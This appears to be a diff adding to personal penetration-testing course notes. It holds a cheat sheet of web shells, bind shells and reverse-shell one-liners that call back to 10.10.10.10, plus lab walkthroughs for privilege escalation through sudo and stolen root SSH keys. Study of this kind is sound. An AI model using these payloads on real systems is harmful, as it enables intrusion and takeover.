@@ -57,7 +57,7 @@ Port(s) | Protocol
 ## nmap scripts
 
 * -sC is used to specify a script (default)
-* nmap --script <script name> -p<port> <host>
+* ``` nmap --script <script name> -p<port> <host> ```
 
 ## ftp
 
@@ -97,9 +97,77 @@ We can extract the version of web servers, supporting frameworks, and applicatio
 * ` show options` find what it needs/can do
 
 
+## Types of Shells
+
+Type of Shell | Method of Communication
+--------------|-----------------------
+Reverse Shell | Connects back to our system and gives us control through a reverse connection.
+Bind Shell | Waits for us to connect to it and gives us control once we do.
+Web Shell | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.
+
+* ``` nc -lvnp 1234 -> Starts a listener ```
+* The Payload All The Things page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.
+* Reverse extremely fragile so if connection is interrupted its over
+* Another type of shell is a Bind Shell. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port.
+* Upgrade to tty -> ```python -c 'import pty; pty.spawn("/bin/bash")'```
+* The final type of shell we have is a Web Shell. A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.
+
+However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:
+
+Web Server | Default Webroot
+-----------|---------------
+Apache 	| /var/www/html/
+Nginx 	| /usr/local/nginx/html/
+IIS 	| c:\inetpub\wwwroot\
+XAMPP 	| C:\xampp\htdocs\
+
+### Best webshell cmds
+* PHP -> ```<?PHP system($_GET['cmd']);?>```
+* JSP -> ```<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>```
+* ASP -> ```<% eval request("cmd") %>```
+
+### Best types of Bind Shells
+
+* Linux -> ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f```
+* python -> ```python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'```
+* powershell -> ```powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();```
+
+### Best commands for Reverse shells
+
+* Windows -> ```powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()```
+
+* Linux 1 -> ```bash -c 'bash -i >& /dev/TCP/10.10.10.10/1234 0>&1'```
+* Linux 2 -> ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f```
+
+## Privilege Escalastion
+* https://book.hacktricks.xyz/ -> good checklist for what to look for to privilege escalate
+* https://github.com/swisskyrepo/PayloadsAllTheThings -> good repo
+* We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS.
+* Another useful tool we may use for server enumeration is the Privilege Escalation Awesome Scripts SUITE (PEASS), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.
+* Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.
+* Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us
+* copy ssh keys -> ```  ssh user@10.10.10.10 -i id_rsa ```
+
 ## Public Exploits (TASK)
 
 1. scan the website using `gobuster` to find that it is a wordpress site
 2. `msfconsole` to start metasploit
 3. `search simple backup 2.7.10` found what to search by reading the website
 4. use the exploit scanner on metasploit to read /flags.txt
+
+## Privilege Escalation (TASK)
+
+### Part 1
+
+1. ```ssh user1@<ip> -p <port>```
+2. ```sudo -l ``` which showed I can execute as user2
+3. ```sudo -u /bin/bash``` spawned a new shell
+4. Looked at /home/user2/flag.txt to get the flag
+
+### Part 2
+
+1. Found that I could read the /root/.ssh/id_rsa
+2. copy and paste it to my machine
+3. chmod 600
+4. login with ```ssh root@<ip> -p <port> -i <keyyoufound>```
+5. ```cat /root/flag.txt```
